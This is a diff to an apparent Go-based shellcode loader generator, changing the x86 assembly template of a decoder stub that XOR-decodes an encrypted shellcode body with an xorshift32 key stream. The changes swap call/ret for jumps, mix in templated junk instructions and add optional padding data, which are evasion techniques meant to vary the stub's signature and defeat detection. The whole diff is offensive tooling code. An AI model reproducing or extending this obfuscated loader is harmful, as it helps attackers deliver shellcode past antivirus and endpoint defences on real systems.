@@ -45,38 +45,57 @@ header:
 
   // decode shellcode body
  loop_xor:
-  mov {{.Reg.edi}}, [{{.Reg.esi}}]             {{igi}}
-  ror {{.Reg.edi}}, 5                          {{igi}}
-  xor {{.Reg.edi}}, {{.Reg.eax}}               {{igi}}
-  rol {{.Reg.edi}}, 17                         {{igi}}
-  xor {{.Reg.edi}}, {{.Reg.ebx}}               {{igi}}
-  mov [{{.Reg.esi}}], {{.Reg.edi}}             {{igi}}
+  mov {{.Reg.edi}}, [{{.Reg.esi}}]             {{igs}}
+  ror {{.Reg.edi}}, 5                          {{igs}}
+  xor {{.Reg.edi}}, {{.Reg.eax}}               {{igs}}
+  rol {{.Reg.edi}}, 17                         {{igs}}
+  xor {{.Reg.edi}}, {{.Reg.ebx}}               {{igs}}
+  mov [{{.Reg.esi}}], {{.Reg.edi}}             {{igs}}
+
+  // call xor shift 32
+  jmp xor_shift_32                             {{igs}}
+ ret_1:
 
   // update address and counter
-  call xor_shift_32                            {{igi}}
- ret_1:
-  add {{.Reg.esi}}, 4                          {{igi}}
-  dec {{.Reg.ecx}}                             {{igi}}
-  jnz loop_xor                                 {{igi}}
+  add {{.Reg.esi}}, 4                          {{igs}}
+  dec {{.Reg.ecx}}                             {{igs}}
+  jnz loop_xor                                 {{igs}}
+
+  // skip function xor shift 32
+  jmp next_1                                   {{igs}}
+
+xor_shift_32:
+  mov {{.Reg.edx}}, {{.Reg.eax}}               {{igs}}
+  shl {{.Reg.edx}}, 13                         {{igs}}
+  xor {{.Reg.eax}}, {{.Reg.edx}}               {{igs}}
+  mov {{.Reg.edx}}, {{.Reg.eax}}               {{igs}}
+  shr {{.Reg.edx}}, 17                         {{igs}}
+  xor {{.Reg.eax}}, {{.Reg.edx}}               {{igs}}
+  mov {{.Reg.edx}}, {{.Reg.eax}}               {{igs}}
+  shl {{.Reg.edx}}, 5                          {{igs}}
+  xor {{.Reg.eax}}, {{.Reg.edx}}               {{igs}}
+  jmp ret_1                                    {{igs}}
+ next_1:
 
   // restore context
   popfd                                        {{igi}}
   popad                                        {{igi}}
 
+{{if .Padding}}
+  {{igi}}  {{igi}}  {{igi}}  {{igi}}
+  {{igi}}  {{igi}}  {{igi}}  {{igi}}
+  {{igi}}  {{igi}}  {{igi}}  {{igi}}
+  {{igi}}  {{igi}}  {{igi}}  {{igi}}
+  {{igi}}  {{igi}}  {{igi}}  {{igi}}
+  {{igi}}  {{igi}}  {{igi}}  {{igi}}
+{{end}}
+
   // go to the shellcode body
   jmp body                                     {{igi}}
 
-xor_shift_32:
-  mov {{.Reg.edx}}, {{.Reg.eax}}               {{igi}}
-  shl {{.Reg.edx}}, 13                         {{igi}}
-  xor {{.Reg.eax}}, {{.Reg.edx}}               {{igi}}
-  mov {{.Reg.edx}}, {{.Reg.eax}}               {{igi}}
-  shr {{.Reg.edx}}, 17                         {{igi}}
-  xor {{.Reg.eax}}, {{.Reg.edx}}               {{igi}}
-  mov {{.Reg.edx}}, {{.Reg.eax}}               {{igi}}
-  shl {{.Reg.edx}}, 5                          {{igi}}
-  xor {{.Reg.eax}}, {{.Reg.edx}}               {{igi}}
-  ret                                          {{igi}}
+{{if .Padding}}
+  {{db .PadData}}
+{{end}}
 
 calc_body_addr:
   pop  {{.Reg.esi}}                            {{igi}}
@@ -188,6 +207,10 @@ type miniDecoderCtx struct {
 
 	// for replace registers
 	Reg map[string]string
+
+	// for prevent call short
+	Padding bool
+	PadData []byte
 }
 
 // The role of the shellcode loader is to execute the shellcode
